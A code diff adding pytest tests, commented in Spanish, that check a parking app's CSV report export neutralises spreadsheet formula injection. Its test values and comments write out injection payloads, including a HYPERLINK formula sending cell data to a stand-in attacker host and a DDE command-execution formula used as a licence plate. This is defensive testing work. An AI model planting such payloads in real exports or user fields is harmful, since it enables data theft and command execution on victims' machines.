@@ -575,3 +575,87 @@ def test_export_sin_ventana_422(
         params={"parking_id": parking.id},
     )
     assert r.status_code == 422, r.text
+
+
+# ── T-77: los CSV neutralizan las formulas ───────────────────────────────
+#
+# OJO (2026-10-22): los informes CSV meten datos que pone un usuario (la
+# matricula la introduce el conductor y el alta manual NO valida el
+# formato; el nombre de la sucursal lo pone un admin). Sin neutralizar, una
+# celda que empieza por "=" es una FORMULA al abrir el CSV en Excel o
+# LibreOffice: `=HYPERLINK("http://atacante/?d="&A1,"clic")` filtra datos
+# de la hoja y `=cmd|'/c calc'!A0` ejecuta un comando en Windows.
+
+
+@pytest.mark.parametrize(
+    "valor",
+    [
+        "=1+1",
+        "=HYPERLINK(\"http://atacante/?d=\"&A1,\"clic\")",
+        "-1+1",
+        "@SUM(A1:A9)",
+        "\t=1+1",
+        "\r=1+1",
+    ],
+)
+def test_escapar_celda_csv_neutraliza_las_formulas(valor: str) -> None:
+    from app.services.reports import escapar_celda_csv
+
+    escapado = escapar_celda_csv(valor)
+    assert escapado == "'" + valor
+    # La celda del CSV empieza por el apostrofo: la hoja de calculo la
+    # muestra como texto y NO la ejecuta.
+    assert escapado.startswith("'")
+
+
+@pytest.mark.parametrize(
+    "valor",
+    [
+        "M 1234 A", "1234ABC", "E1234", "Madrid", "", "a-b", "12-34",
+        # Un importe en NEGATIVO empieza por "-" pero no es una formula:
+        # escaparlo ensuciaria todos los informes de margenes con perdidas.
+        "-12.50", "-0.01", "+3", "42",
+    ],
+)
+def test_escapar_celda_csv_no_toca_los_valores_normales(valor: str) -> None:
+    """Cualquier texto corriente tiene que salir intacto (y los numeros,
+    tambien: un negativo no es una formula)."""
+    from app.services.reports import escapar_celda_csv
+
+    assert escapar_celda_csv(valor) == valor
+
+
+def test_el_csv_de_tickets_neutraliza_una_matricula_con_formula(
+    client: TestClient, db_session: Session,
+):
+    """El caso real: un conductor pone una matricula que es una formula."""
+    parking = ah._seed_parking(db_session, code="P-EX-CSV")
+    admin = ah._seed_admin(db_session, email="admin-csv@test.es")
+    headers = ah._login_headers(client, admin.email, "admin12345")
+
+    matricula = "=cmd|'/c calc'!A0"
+    _mk_ticket(
+        db_session, parking_id=parking.id,
+        entry_at=datetime(2026, 1, 10, 9, tzinfo=UTC),
+        exit_at=datetime(2026, 1, 10, 10, tzinfo=UTC),
+        total=20.0, plate=matricula,
+    )
+    db_session.commit()
+
+    r = client.get(
+        "/api/v1/admin/reports/tickets.csv",
+        headers=headers,
+        params=_params(parking.id),
+    )
+    assert r.status_code == 200, r.text
+    # La celda sale neutralizada (con el apostrofo delante)...
+    assert "'" + matricula in r.text
+    # ...y la formula no aparece "suelta" en ninguna celda.
+    filas = list(csv.reader(io.StringIO(r.text)))
+    for fila in filas:
+        for celda in fila:
+            assert not celda.startswith(("=", "+", "@")), celda
+    # Y el dato sigue siendo legible (el apostrofo es el marcador de texto).
+    cabeceras, datos = _csv_filas(r)
+    assert cabeceras[1] == "matricula"
+    assert datos[0]["matricula"] == "'" + matricula
